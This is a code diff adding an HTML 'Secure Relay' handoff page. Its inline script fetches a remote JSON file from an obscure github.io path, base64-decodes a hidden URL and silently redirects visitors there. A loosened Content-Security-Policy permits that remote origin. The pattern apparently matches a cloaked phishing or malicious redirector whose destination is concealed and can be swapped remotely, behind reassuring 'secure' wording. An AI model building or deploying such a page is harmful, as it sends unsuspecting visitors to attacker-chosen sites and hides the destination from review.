@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Secure Relay</title>
+  <meta name="description" content="Lightweight handoff page for a secure link relay"/>
+  <link rel="icon" href="/favicon.ico" type="image/x-icon"/>
+
+  <!-- CSP mirrors prior behavior and allows inline JS + the remote config origin -->
+  <meta http-equiv="Content-Security-Policy" content="
+    default-src 'self';
+    script-src  'self' 'unsafe-inline' https://pixelspyflame32.github.io;
+    style-src   'self';
+    connect-src 'self' https://pixelspyflame32.github.io
+  "/>
+
+  <link rel="stylesheet" href="theme-v2.css"/>
+</head>
+<body>
+  <main class="relay-wrap">
+    <section class="handoff-panel" role="status" aria-live="polite">
+      <div class="emblem" aria-hidden="true">
+        <svg width="44" height="44" viewBox="0 0 24 24" fill="none" role="img" aria-label="paper plane">
+          <path d="M3 11.5l18-8-7.6 17.1-2.1-6.3L3 11.5z" stroke="currentColor" stroke-width="2" fill="none" stroke-linejoin="round"/>
+          <path d="M13.3 14.3l4.5 4.2" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+        </svg>
+      </div>
+      <h1>Preparing a secure relay…</h1>
+      <p id="live-status" data-testid="status">Booting…</p>
+      <p id="aux-note" class="aux-note" aria-live="polite"></p>
+    </section>
+
+    <noscript>
+      <div class="noscript">JavaScript is required to continue.</div>
+    </noscript>
+  </main>
+
+  <script>
+  (async function() {
+    const $ = (sel) => document.querySelector(sel);
+    const statusEl = $('#live-status');
+    const noteEl = $('#aux-note');
+
+    statusEl.textContent = 'Negotiating link…';
+    noteEl.textContent = '';
+
+    try {
+      const res = await fetch('https://pixelspyflame32.github.io/pixelspyflame32/wokjer.borks', { method: 'GET' });
+      if (!res.ok) throw new Error(`Config HTTP ${res.status}`);
+      const data = await res.json();
+      const encoded = data && data.c;
+      if (typeof encoded !== 'string') throw new Error('Invalid payload');
+
+      const target = atob(encoded);
+      if (!/^https?:\/\//i.test(target)) throw new Error('Unexpected URL');
+
+      statusEl.textContent = 'Transferring you now…';
+      // Use replace to avoid polluting back stack while keeping the same behavior
+      window.location.replace(target);
+    } catch (err) {
+      console.error(err);
+      statusEl.textContent = 'We hit a snag.';
+      noteEl.textContent = String(err && err.message || err);
+    }
+  })();
+  </script>
+</body>
+</html>
